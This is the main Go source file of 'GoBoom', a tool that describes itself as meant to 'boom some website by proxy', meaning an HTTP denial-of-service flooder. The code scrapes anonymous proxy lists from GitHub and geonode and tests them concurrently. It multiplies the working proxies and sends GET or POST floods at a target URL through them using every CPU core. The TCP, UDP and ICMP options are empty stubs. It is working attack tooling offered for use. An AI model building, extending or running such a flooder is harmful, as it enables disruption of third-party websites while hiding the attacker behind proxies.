package main

import (
	"encoding/json"
	"fmt"
	"goBoom/engines"
	"goBoom/lib"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/akamensky/argparse"
)

var statusCodeToEscape = []string{
	//"503 Too many open connections",
	"401 Unauthorized",
	"409 Conflict",
	"404 Not Found",
	"502 Bad Gateway",
	"504 Gateway Timeout",
	"407 Proxy Authentication Required",
	"400 Bad Request",
	"502 Proxy Error",
	"403 Forbidden",
	//"503 Service Unavailable",
	"504 DNS Name Not Found",
	"407 Unauthorized",
	"405 Method Not Allowed",
	//"503 Service Temporarily Unavailable",
}

func getProxyList_github(link string) []string {
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get(link)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

type Proxy_genode struct {
	Data []struct {
		ID                 string      `json:"_id"`
		IP                 string      `json:"ip"`
		AnonymityLevel     string      `json:"anonymityLevel"`
		Asn                string      `json:"asn"`
		City               string      `json:"city"`
		Country            string      `json:"country"`
		CreatedAt          time.Time   `json:"created_at"`
		Google             bool        `json:"google"`
		Isp                string      `json:"isp"`
		LastChecked        int         `json:"lastChecked"`
		Latency            float32     `json:"latency"`
		Org                string      `json:"org"`
		Port               string      `json:"port"`
		Protocols          []string    `json:"protocols"`
		Region             interface{} `json:"region"`
		ResponseTime       int         `json:"responseTime"`
		Speed              int         `json:"speed"`
		UpdatedAt          time.Time   `json:"updated_at"`
		WorkingPercent     interface{} `json:"workingPercent"`
		UpTime             float64     `json:"upTime"`
		UpTimeSuccessCount int         `json:"upTimeSuccessCount"`
		UpTimeTryCount     int         `json:"upTimeTryCount"`
	} `json:"data"`
	Total int `json:"total"`
	Page  int `json:"page"`
	Limit int `json:"limit"`
}

func getProxyList_genode() []string {
	// get the list of proxy at https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=80&protocols=http%2Chttps&anonymityLevel=elite
	// return a list of proxy
	var proxy_list []string
	resp, err := http.Get("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps&anonymityLevel=elite&anonymityLevel=anonymous")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	var proxy_genode Proxy_genode
	err = json.Unmarshal(body, &proxy_genode)
	if err != nil {
		log.Fatal(err)
	}
	for _, proxy := range proxy_genode.Data {
		proxy_list = append(proxy_list, proxy.IP+":"+proxy.Port)
	}
	return proxy_list
}

func getProxyList_file(path string) []string {
	//format of the list is ip:port
	//return a list of proxy
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func add_good_proxy(proxy string, good_proxy []string) []string {
	var mutex = &sync.Mutex{}
	mutex.Lock()
	good_proxy = append(good_proxy, proxy)
	mutex.Unlock()
	return good_proxy
}

func test_proxy(proxy_file []string) []string {
	var good_proxy []string
	//get the list of proxy
	//proxy_list := getProxyList_genode()
	proxy_list := getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt")...)

	if len(proxy_file) > 0 {
		for _, file := range proxy_file {
			proxy_list = append(proxy_list, getProxyList_file(file)...)
		}
	}

	//remove duplicate
	proxy_list = lib.RemoveDuplicates(proxy_list)
	fmt.Println("Total proxy : ", len(proxy_list))
	url := "https://1.1.1.1"
	wg2 := sync.WaitGroup{}
	fmt.Println("Checking proxy...")
	for _, proxy := range proxy_list {
		wg2.Add(1)
		go func(proxy string) {
			defer wg2.Done()
			result := engines.HandlerProxy(url, proxy)
			//if more than 5 seconde, the proxy is not good
			if result == "200 OK" || result == "200" {
				good_proxy = add_good_proxy(proxy, good_proxy)
			}
		}(proxy)
	}
	wg2.Wait()

	return good_proxy
}

func main() {
	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
	get := parser.String("", "get", &argparse.Options{Required: false, Help: "Url (get) to boom"})
	post := parser.String("", "post", &argparse.Options{Required: false, Help: "Url (post) to boom"})
	post_data := parser.String("", "post-data", &argparse.Options{Required: false, Help: "Path to file with data to send with post"})
	tcp := parser.String("", "tcp", &argparse.Options{Required: false, Help: "Ip to boom with tcp"})
	udp := parser.String("", "udp", &argparse.Options{Required: false, Help: "Ip to boom with udp"})
	icmp := parser.String("", "icmp", &argparse.Options{Required: false, Help: "Ip to boom with icmp"})
	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of core to use", Default: "max"})
	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 12})
	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}

	//set max GOMAXPROCS
	//detect the number of cpu
	cpu := runtime.NumCPU()
	//if threads superior to cpu convert to cpu
	if *threads == "max" {
		runtime.GOMAXPROCS(cpu)
	} else {
		threads_int, err := strconv.Atoi(*threads)
		if err != nil {
			fmt.Println("Error with threads")
			os.Exit(1)
		}
		if threads_int > cpu && *mode == 1 {
			runtime.GOMAXPROCS(cpu)
		} else {
			runtime.GOMAXPROCS(threads_int)
			cpu = threads_int
		}
	}

	good_proxy := []string{}
	if *mode == 1 {
		//get the list of proxy
		good_proxy := test_proxy(*proxy_file)
		fmt.Println("Good proxy : ", len(good_proxy))
		fmt.Println("After multiply : ", len(good_proxy)*(*proxy_mult))
		//multiply the good proxy
		for i := 0; i < *proxy_mult; i++ {
			good_proxy = append(good_proxy, good_proxy...)
		}
	}

	if *get != "" {
		state := engines.Get(*get, good_proxy, cpu)
		if state != "" {
			fmt.Println(state)
		}
	} else if *post != "" {
		engines.Post(*post, good_proxy, cpu, *post_data)
	} else if *tcp != "" {
		os.Exit(1)
	} else if *udp != "" {
		os.Exit(1)
	} else if *icmp != "" {
		os.Exit(1)
	} else {
		fmt.Println(parser.Usage(err))
		os.Exit(1)
	}
}
